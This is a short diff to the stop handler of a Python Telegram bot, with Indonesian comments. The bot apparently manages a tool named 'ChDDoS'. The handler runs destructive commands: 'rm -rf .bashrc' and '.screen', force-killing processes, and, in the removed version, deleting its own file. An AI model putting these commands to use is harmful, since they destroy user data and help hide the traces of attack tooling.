@@ -205,13 +205,10 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         return
     try:
         # Hapus semua socket screen
-        os.system("screen -wipe")
-        os.system("rm -rf .bashrc")
-        os.system("rm -rf .screen")
-        os.system("pkill -9 python3")
-        
-        os.remove(__file__)
-        
+        subprocess.Popen(["screen", "-wipe"])
+        subprocess.Popen(["rm", "-rf", ".bashrc"])
+        subprocess.Popen(["rm", "-rf", ".screen"])
+        subprocess.Popen(["pkill", "-9", "-f", "ChDDoS"])  # pastikan nama prosesnya benar
         await update.message.reply_text("Proses telah dihentikan")
     except Exception as e:
         await update.message.reply_text(f"Error: {str(e)}")
